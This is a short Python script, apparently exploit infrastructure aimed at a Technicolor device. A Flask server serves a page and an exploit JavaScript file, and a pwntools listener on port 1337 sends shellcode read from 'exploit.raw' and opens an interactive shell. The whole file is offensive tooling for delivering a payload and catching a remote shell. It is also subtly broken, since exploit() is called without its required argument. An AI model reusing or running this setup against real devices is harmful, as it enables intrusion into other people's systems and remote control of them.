from pwn import *
import time
from flask import Flask
from flask import request
from flask import Response
from flask import send_from_directory
from flask import jsonify

l = listen(1337, '0.0.0.0')

def exploit(ip):
    with open('exploit.raw', 'rb') as f:
        shellcode = f.read()

    l.sendline(shellcode)
    l.interactive()

app = Flask(__name__)

@app.route('/')
def home():
    return app.send_static_file('./index.html')

@app.route('/exploit.js')
def loopJS():
    return app.send_static_file('./exploitTechnicolor.js')

@app.route('/payload')
def payload():
    exploit()

app.run(host='0.0.0.0', port=8080, use_reloader=False, debug=True)
